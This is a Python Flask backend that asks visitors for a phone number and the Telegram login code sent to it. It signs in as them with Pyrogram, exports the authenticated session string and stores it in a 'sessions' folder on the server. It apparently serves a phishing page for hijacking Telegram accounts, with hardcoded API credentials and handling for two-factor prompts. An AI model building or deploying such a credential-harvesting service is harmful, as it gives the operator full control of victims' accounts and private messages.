import os
import asyncio
from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
from pyrogram import Client
from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid

app = Flask(__name__)
CORS(app)

API_ID = 33511945
API_HASH = "d044392a17690c14ee5b4a23651a0700"

temp_clients = {}

@app.route('/', methods=['GET'])
def home():
    try:
        return send_file('index.html')
    except Exception:
        return "index.html not found", 404

@app.route('/verify', methods=['GET'])
def verify_page():
    try:
        return send_file('verify.html')
    except Exception:
        return "verify.html not found", 404

@app.route('/send-code', methods=['POST'])
def send_code():
    data = request.json
    phone = data.get('phone')
    
    if not phone:
        return jsonify({"status": "error", "message": "Phone number is required"}), 400

    try:
        session_name = f"session_{phone.replace('+', '')}"
        client = Client(session_name, api_id=API_ID, api_hash=API_HASH, in_memory=True)
        
        # থ্রেড সেফ ইভেন্ট লুপ হ্যান্ডেলিং
        try:
            loop = asyncio.get_event_loop()
            if loop.is_closed():
                raise RuntimeError
        except RuntimeError:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
        
        async def main():
            await client.connect()
            sent_code = await client.send_code(phone)
            return sent_code

        sent_code = loop.run_until_complete(main())
        
        temp_clients[phone] = {
            "client": client,
            "loop": loop,
            "phone_code_hash": sent_code.phone_code_hash
        }
        
        return jsonify({"status": "success", "message": "OTP code sent to Telegram!"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/verify-code', methods=['POST'])
def verify_code():
    data = request.json
    phone = data.get('phone')
    code = data.get('code')
    
    if not phone or not code:
        return jsonify({"status": "error", "message": "Phone and Code are required"}), 400

    if phone not in temp_clients:
        return jsonify({"status": "error", "message": "Session expired. Please request code again."}), 400

    user_data = temp_clients[phone]
    client = user_data["client"]
    loop = user_data["loop"]
    phone_code_hash = user_data["phone_code_hash"]

    try:
        async def verify_main():
            await client.sign_in(phone, phone_code_hash, code)
            session_string = await client.export_session_string()
            
            # সার্ভারে ইউজারের সেশন ফাইল সেভ করা
            os.makedirs("sessions", exist_ok=True)
            session_filename = f"sessions/{phone.replace('+', '')}.session"
            with open(session_filename, "w") as f:
                f.write(session_string)
                
            await client.disconnect()

        loop.run_until_complete(verify_main())
        del temp_clients[phone]
        
        return jsonify({"status": "success", "message": "Session generated successfully!"})
        
    except PhoneCodeInvalid:
        return jsonify({"status": "error", "message": "Invalid OTP code!"}), 400
    except SessionPasswordNeeded:
        return jsonify({"status": "success", "message": "2FA Password required"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
